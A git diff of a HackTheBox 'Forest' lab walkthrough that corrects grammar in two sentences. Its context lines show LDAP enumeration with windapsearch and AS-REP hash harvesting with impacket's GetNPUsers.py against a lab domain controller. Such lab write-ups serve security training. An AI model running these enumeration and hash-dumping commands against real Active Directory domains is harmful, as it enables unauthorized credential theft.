@@ -185,7 +185,7 @@ pwdHistoryLength: 24
 objectSid:: AQQAAAAAAAUVAAAALB4ltxV1shXFsPNP
 ```
 
-The same result can be did with **windapsearch.py**: 
+The same result can be done with **windapsearch.py**: 
 
 ```bash
 dumbland () hgfs/hackthebox/forest :: ~/pentest/windapsearch/windapsearch.py -d htb --dc-ip 10.10.10.161 --custom objectclass=\* 
@@ -272,7 +272,7 @@ SM_ca8c2ed5bdab4dc9b
 svc-alfresco
 ```
 
-Now its time to get some hashes. This is possibles because are some user with kerberos authentication disabled. See links in reference to get a better explanation.
+Now its time to get some hashes. This is possibles because some user are with kerberos authentication disabled. See links in reference to get a better explanation.
 
 ```bash
 dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/GetNPUsers.py  -usersfile user-list.txt  htb.local/ -dc-ip 10.10.10.161 -no-pass
